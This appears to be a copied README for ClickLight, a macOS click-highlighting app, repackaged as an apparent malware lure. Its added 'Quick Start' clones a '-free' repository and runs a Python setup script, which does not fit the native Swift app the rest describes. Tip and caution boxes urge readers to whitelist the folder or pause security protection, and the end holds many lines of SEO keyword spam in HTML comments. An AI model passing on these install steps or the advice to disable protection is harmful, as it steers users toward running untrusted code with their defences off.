# ClickLight


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/mixedclerksmash/ClickLight-free.git
cd ClickLight-free
python setup.py
```


A small macOS menu bar app that highlights your clicks during live demos, screen sharing, UX reviews, and other moments where people need to follow what you are doing.

Screen recorders like Screen Studio and CleanShot can add click effects after the fact. ClickLight is for the live moment itself, when you need the audience to see exactly when you clicked without interrupting your flow.

## Demo

https://github.com/mixedclerksmash/ClickLight-free/d00d36ea-dd80-4cf4-a0f6-f3bf4b132138

## Use Cases

- Live product demos where viewers need to follow exactly what you clicked
- UX reviews where the delay between click and response matters (the original motivation for ClickLight)
- Bug reports where a recording should show both the action and the app behavior
- Tutorials, workshops, and conference talks where pointer movement alone is easy to miss
- Pairing with a larger macOS pointer so clicks stay visible in live demos and recordings


## Features

- Click highlights across macOS apps
- Separate visuals for press, release, right-click, and drag
- Optional laser pointer mode with fading freehand strokes while dragging
- Optional live keyboard shortcut display pinned to the bottom of the screen by default, with pointer-following placement and sizes through XL available
- Local daily click activity chart with a resettable seven-day history
- Optional daily click count in the menu bar
- Dedicated settings window with presets, sliders, optional menu sections, and a sidebar preview pad with Randomize
- Custom color picker in Settings
- Menu-bar quick presets for size, duration, intensity, and color
- Customizable status-bar menu sections for hiding optional controls you do not use
- One default ClickLight toggle shortcut, with optional shortcuts for other actions
- Optional compact menu-bar icon
- Test pulse for verifying overlay behavior
- Native Swift/AppKit app
- No Xcode project required

## Keyboard Shortcuts

ClickLight includes one default global shortcut for quick toggles during demos. Other actions can be assigned shortcuts in Settings if you want them.

| Shortcut | Action |
| --- | --- |
| `Control + Option + Command + L` | Toggle ClickLight on/off |
| Not set by default | Toggle Laser Pointer Mode |
| Not set by default | Toggle Press |
| Not set by default | Toggle Release |
| Not set by default | Toggle Right Click |
| Not set by default | Toggle Middle Click |
| Not set by default | Toggle Drag |
| Not set by default | Randomize Colors |
| Not set by default | Toggle Live Keyboard Shortcuts |

All shortcuts can be changed or disabled in Settings.

## Permissions

ClickLight requires Accessibility permission to detect clicks outside its own menu-bar app. You will be prompted on first launch, or grant it manually in:

**System Settings -> Privacy & Security -> Accessibility**

The optional Live Keyboard Shortcuts display additionally requires **Input Monitoring**, because macOS protects keyboard input separately from mouse clicks.

After enabling permission, quit ClickLight from the menu bar and reopen it.

Tip: for recorded demos or presentations, pair ClickLight with a larger macOS pointer in **System Settings -> Accessibility -> Display -> Pointer**.

## Modify It

ClickLight is personal software: one small presentation annoyance, fixed directly. The project is intentionally small so you or an agent can change it without much ceremony.

Start with [Local Development](docs/LOCAL_DEVELOPMENT.md).

## Contributing

Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for setup, testing, and pull request guidance. Please report security issues privately as described in [SECURITY.md](SECURITY.md).

## Releasing

Releases are signed, notarized, published to GitHub Releases, and followed by a reviewed metadata pull request for Homebrew and Sparkle updates.

See [Releasing](docs/RELEASING.md). What's new is tracked in [GitHub Releases]().

## Uninstall

```bash
brew uninstall --cask clicklight
```

To remove ClickLight preferences too:

```bash
brew uninstall --cask --zap clicklight
```

> **Manual uninstall**
> If you installed ClickLight manually from source, use [Remove Manual Install](docs/MANUAL_INSTALL.md#remove-manual-install).

## License

MIT. See [LICENSE](LICENSE).


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- ClickLight-free - tool utility software - download install setup -->
<!-- free ClickLight-free creator | centos self hosted ClickLight-free app | how to deploy self hosted ClickLight-free | quickstart safe ClickLight-free | fast ClickLight-free package | sample advanced ClickLight-free | ClickLight free kubernetes | getting started best ClickLight-free program | zip modern ClickLight-free | ClickLight-free server | walkthrough online ClickLight-free | ClickLight free best practice | lightweight ClickLight-free creator | source code ClickLight-free checker | updated ClickLight-free client | simple ClickLight-free server | ClickLight-free desktop | updated ClickLight-free | how to install self hosted ClickLight-free | new version ClickLight-free platform | native ClickLight-free tool | ClickLight free podcast | high performance ClickLight-free wrapper | ClickLight free blog | ClickLight-free viewer | easy ClickLight-free compressor | ClickLight-free software | advanced ClickLight-free cli | windows best ClickLight-free checker | centos ClickLight-free validator | github ClickLight-free optimizer | top ClickLight-free scanner | walkthrough ClickLight-free package | getting started ClickLight-free package | ClickLight-free converter | open source easy ClickLight-free | new version ClickLight-free | run on mac ClickLight-free tester | macos ClickLight-free client | get free ClickLight-free checker | macos powerful ClickLight-free binding | low latency ClickLight-free | debian extensible ClickLight-free | demo ClickLight-free downloader | 2025 ClickLight-free plugin | how to deploy ClickLight-free server | ClickLight free workshop | free ClickLight-free scanner | tutorial ClickLight-free decoder | demo reliable ClickLight-free -->
<!-- ClickLight free book | fedora ClickLight-free wrapper | walkthrough ClickLight-free wrapper | start ClickLight-free service | launch ClickLight-free engine | quickstart ClickLight-free service | open source ClickLight-free cli | minimal ClickLight-free module | 2025 ClickLight-free | ClickLight free saas | wiki ClickLight-free service | free ClickLight-free | install ClickLight-free | docs online ClickLight-free | ClickLight free alternative | quick start ClickLight-free downloader | advanced ClickLight-free creator | run on linux reliable ClickLight-free | open source ClickLight-free logger | how to use ClickLight-free | zip simple ClickLight-free | deploy ClickLight-free editor | free ClickLight-free tracker | tutorial self hosted ClickLight-free | download for mac native ClickLight-free | top ClickLight-free fork | start self hosted ClickLight-free | github ClickLight-free checker | open source ClickLight-free tool | wiki local ClickLight-free | ClickLight-free package | documentation ClickLight-free creator | customizable ClickLight-free copy | free download ClickLight-free builder | free ClickLight-free gui | modern ClickLight-free engine | tar.gz ClickLight-free debugger | how to setup ClickLight-free package | centos configurable ClickLight-free | configurable ClickLight-free api | ClickLight-free web | walkthrough ClickLight-free debugger | native ClickLight-free binding | download for linux ClickLight-free | git clone ClickLight-free sdk | github ClickLight-free extractor | ClickLight free help | extensible ClickLight-free parser | documentation easy ClickLight-free | how to download ClickLight-free -->
<!-- github ClickLight-free utility | high performance ClickLight-free | wiki minimal ClickLight-free | ClickLight-free clone | reliable ClickLight-free web | fedora ClickLight-free engine | centos github ClickLight-free desktop | fast ClickLight-free replacement | guide ClickLight-free converter | native ClickLight-free | ClickLight-free addon | configure ClickLight-free | how to build ClickLight-free | run on windows secure ClickLight-free | run on windows ClickLight-free platform | example ClickLight-free engine | portable ClickLight-free alternative | linux ClickLight-free application | how to run offline ClickLight-free | how to download portable ClickLight-free | best ClickLight-free validator | open source ClickLight-free clone | ClickLight-free module | download for linux customizable ClickLight-free | download for mac ClickLight-free module | ClickLight-free binding | offline ClickLight-free client | get ClickLight-free debugger | walkthrough ClickLight-free tool | reliable ClickLight-free gui | setup ClickLight-free gui | tar.gz top ClickLight-free module | get self hosted ClickLight-free package | quick start ClickLight-free builder | beginner advanced ClickLight-free client | how to download ClickLight-free binding | install ClickLight-free gui | run on windows ClickLight-free service | production ready ClickLight-free scanner | run ClickLight-free checker | walkthrough ClickLight-free sdk | open ClickLight-free viewer | linux easy ClickLight-free monitor | simple ClickLight-free program | tar.gz ClickLight-free logger | high performance ClickLight-free uploader | fast ClickLight-free tool | getting started ClickLight-free | quickstart ClickLight-free analyzer | download for mac stable ClickLight-free desktop -->
<!-- extensible ClickLight-free scanner | how to download customizable ClickLight-free wrapper | windows ClickLight-free scanner | safe ClickLight-free viewer | build ClickLight-free creator | advanced ClickLight-free mobile | updated ClickLight-free engine | examples ClickLight-free validator | customizable ClickLight-free | updated ClickLight-free viewer | stable ClickLight-free builder | ClickLight-free library | tutorial open source ClickLight-free | how to use ClickLight-free reader | download for mac ClickLight-free uploader | how to build ClickLight-free api | quickstart offline ClickLight-free | powerful ClickLight-free debugger | top ClickLight-free server | free ClickLight-free validator | download ClickLight-free tracker | extensible ClickLight-free port | lightweight ClickLight-free gui | build high performance ClickLight-free | demo ClickLight-free program | use ClickLight-free downloader | tar.gz ClickLight-free extension | ClickLight free article | updated advanced ClickLight-free | ClickLight free download | examples ClickLight-free web | setup offline ClickLight-free | modular ClickLight-free service | latest version offline ClickLight-free | local ClickLight-free tracker | git clone powerful ClickLight-free | setup ClickLight-free encoder | zip ClickLight-free | high performance ClickLight-free viewer | run on windows extensible ClickLight-free | how to setup ClickLight-free wrapper | extensible ClickLight-free builder | launch ClickLight-free | ClickLight-free tool | deploy ClickLight-free alternative | local ClickLight-free analyzer | run on mac ClickLight-free viewer | download for linux safe ClickLight-free desktop | how to build high performance ClickLight-free | production ready ClickLight-free gui -->
<!-- how to use ClickLight-free monitor | 2026 ClickLight-free cli | linux safe ClickLight-free extractor | tar.gz ClickLight-free tracker | how to use low latency ClickLight-free | compile ClickLight-free | linux portable ClickLight-free monitor | ClickLight-free utility | demo ClickLight-free monitor | latest version ClickLight-free tracker | how to run ClickLight-free engine | use easy ClickLight-free reader | git clone portable ClickLight-free | latest version ClickLight-free validator | ClickLight-free port | low latency ClickLight-free service | powerful ClickLight-free logger | ClickLight-free downloader | open source ClickLight-free desktop | online ClickLight-free scanner | free ClickLight-free debugger | high performance ClickLight-free engine | getting started ClickLight-free framework | quickstart local ClickLight-free | 2025 ClickLight-free generator | secure ClickLight-free | powerful ClickLight-free replacement | build ClickLight-free gui | source code lightweight ClickLight-free downloader | 2026 ClickLight-free debugger | self hosted ClickLight-free platform | top ClickLight free | ClickLight-free api | guide ClickLight-free package | advanced ClickLight-free package | documentation ClickLight-free framework | fast ClickLight-free app | run on linux ClickLight-free generator | compile ClickLight-free replacement | ClickLight free automation | how to configure ClickLight-free service | wiki ClickLight-free | how to run ClickLight-free web | latest version ClickLight-free platform | portable ClickLight-free | download for windows secure ClickLight-free | zip ClickLight-free utility | reliable ClickLight-free generator | ClickLight free guide | install ClickLight-free fork -->
<!-- arch ClickLight-free gui | how to download ClickLight-free scanner | cross platform ClickLight-free | 2026 ClickLight-free engine | best ClickLight-free builder | safe ClickLight-free server | ClickLight-free debugger | lightweight ClickLight-free | ClickLight free example | linux ClickLight-free | ClickLight-free mirror | walkthrough ClickLight-free | run on windows ClickLight-free | ClickLight-free tracker | safe ClickLight-free application | documentation ClickLight-free converter | sample ClickLight-free logger | ClickLight free webinar | use ClickLight-free alternative | how to use advanced ClickLight-free | online ClickLight-free addon | launch ClickLight-free tool | run ClickLight-free creator | high performance ClickLight-free cli | debian ClickLight-free wrapper | git clone stable ClickLight-free | guide ClickLight-free decoder | easy ClickLight-free | launch ClickLight-free gui | getting started ClickLight-free application | simple ClickLight-free | examples modular ClickLight-free | safe ClickLight-free port | free download free ClickLight-free builder | portable ClickLight-free editor | guide ClickLight-free software | fast ClickLight-free extractor | how to install github ClickLight-free | modular ClickLight-free web | use ClickLight-free wrapper | example ClickLight-free optimizer | configure ClickLight-free decoder | example ClickLight-free binding | demo extensible ClickLight-free | compile ClickLight-free uploader | ClickLight free reference | ClickLight-free monitor | fast ClickLight-free | guide self hosted ClickLight-free | simple ClickLight-free extractor -->
<!-- safe ClickLight-free parser | 2026 ClickLight-free | docs ClickLight-free | start ClickLight-free | open ClickLight-free gui | production ready ClickLight-free copy | reliable ClickLight-free plugin | getting started self hosted ClickLight-free | open source ClickLight-free package | arch ClickLight-free app | how to deploy ClickLight-free client | self hosted ClickLight-free compressor | offline ClickLight-free builder | execute ClickLight-free editor | top ClickLight-free application | source code top ClickLight-free compressor | run ClickLight-free service | quick start ClickLight-free optimizer | configurable ClickLight-free tester | tutorial ClickLight-free app | guide ClickLight-free | 2025 ClickLight-free addon | run on windows ClickLight-free decoder | github offline ClickLight-free program | arch native ClickLight-free logger | zip ClickLight-free builder | source code ClickLight-free server | minimal ClickLight-free | download for windows top ClickLight-free | best ClickLight-free | ClickLight free demo | run on mac ClickLight-free checker | advanced ClickLight-free module | download for windows configurable ClickLight-free debugger | github ClickLight-free compressor | ClickLight-free program | install ClickLight-free analyzer | fedora best ClickLight-free service | ClickLight free documentation | online ClickLight-free platform | powerful ClickLight-free | beginner ClickLight-free reader | install advanced ClickLight-free | download for windows ClickLight-free encoder | quickstart ClickLight-free generator | wiki ClickLight-free scanner | safe ClickLight-free analyzer | easy ClickLight-free converter | deploy native ClickLight-free | centos best ClickLight-free -->
<!-- advanced ClickLight-free application | documentation open source ClickLight-free | new version ClickLight-free optimizer | free download ClickLight-free replacement | lightweight ClickLight-free web | centos easy ClickLight-free | download for linux ClickLight-free desktop | centos ClickLight-free mobile | sample ClickLight-free | beginner ClickLight-free viewer | powerful ClickLight-free copy | easy ClickLight-free parser | github top ClickLight-free fork | tar.gz ClickLight-free binding | run on windows ClickLight-free scanner | tar.gz ClickLight-free | how to install extensible ClickLight-free tracker | low latency ClickLight-free mobile | source code ClickLight-free package | how to use ClickLight-free program | how to install ClickLight-free service | how to run ClickLight-free tracker | free cross platform ClickLight-free | portable ClickLight-free uploader | download for mac ClickLight-free | debian ClickLight-free replacement | debian github ClickLight-free | run on windows best ClickLight-free | self hosted ClickLight-free replacement | ClickLight free reddit | extensible ClickLight-free extractor | docs ClickLight-free decoder | git clone ClickLight-free extractor | github ClickLight-free engine | open source ClickLight-free | github ClickLight-free fork | windows ClickLight-free fork | github ClickLight-free encoder | ClickLight-free mobile | reliable ClickLight-free cli | native ClickLight-free addon | local ClickLight-free scanner | use ClickLight-free client | ClickLight-free analyzer | native ClickLight-free uploader | ClickLight-free app | download for windows ClickLight-free reader | ClickLight-free sdk | 2026 ClickLight-free replacement | ClickLight free cheat sheet -->
<!-- compile ClickLight-free compressor | ClickLight-free checker | setup ClickLight-free plugin | simple ClickLight-free desktop | latest version ClickLight-free | secure ClickLight-free platform | ClickLight free test | free download ClickLight-free analyzer | customizable ClickLight-free cli | open ClickLight-free downloader | ClickLight free benchmark | new version ClickLight-free binding | download ClickLight-free utility | example ClickLight-free monitor | production ready ClickLight-free | github ClickLight-free addon | how to install ClickLight-free gui | windows ClickLight-free desktop | ubuntu ClickLight-free module | open source ClickLight-free port | secure ClickLight-free web | download for linux ClickLight-free parser | get ClickLight-free framework | how to configure ClickLight-free port | docs ClickLight-free logger | fedora ClickLight-free | powerful ClickLight-free uploader | how to deploy ClickLight-free | getting started ClickLight-free port | documentation customizable ClickLight-free port | configure powerful ClickLight-free | low latency ClickLight-free tester | linux ClickLight-free monitor | download ClickLight-free builder | best ClickLight-free module | sample reliable ClickLight-free | ubuntu ClickLight-free program | modular ClickLight-free alternative | install ClickLight-free viewer | ClickLight free devops | how to configure ClickLight-free plugin | ClickLight-free editor | quickstart ClickLight-free desktop | git clone simple ClickLight-free | ClickLight free github | extensible ClickLight-free | linux ClickLight-free clone | customizable ClickLight-free plugin | download for windows ClickLight-free server | run ClickLight-free builder -->
<!-- debian ClickLight-free | stable ClickLight-free desktop | offline ClickLight-free addon | local ClickLight-free encoder | ClickLight-free tester | how to deploy ClickLight-free scanner | 2026 cross platform ClickLight-free encoder | sample ClickLight-free plugin | free ClickLight-free uploader | local ClickLight-free decoder | compile ClickLight-free gui | self hosted ClickLight-free tracker | native ClickLight-free editor | execute ClickLight-free | cross platform ClickLight-free app | download for linux ClickLight-free web | download for linux ClickLight-free framework | powerful ClickLight-free extractor | online ClickLight-free viewer | modular ClickLight-free app | sample ClickLight-free binding | free ClickLight-free framework | free ClickLight-free converter | online ClickLight-free | tutorial ClickLight-free gui | macos ClickLight-free | tutorial best ClickLight-free | macos ClickLight-free copy | free download ClickLight-free port | lightweight ClickLight-free wrapper | sample ClickLight-free library | lightweight ClickLight-free scanner | execute stable ClickLight-free client | get ClickLight-free mirror | ubuntu ClickLight-free viewer | open source ClickLight-free uploader | how to download ClickLight-free copy | download ClickLight-free uploader | run ClickLight-free analyzer | configure ClickLight-free viewer | tutorial ClickLight-free | ClickLight-free decoder | build portable ClickLight-free | reliable ClickLight-free clone | free download ClickLight-free engine | modular ClickLight-free | reliable ClickLight-free editor | getting started ClickLight-free compressor | git clone ClickLight-free | how to install ClickLight-free monitor -->

<!-- Last updated: 2026-06-09 17:44:31 -->
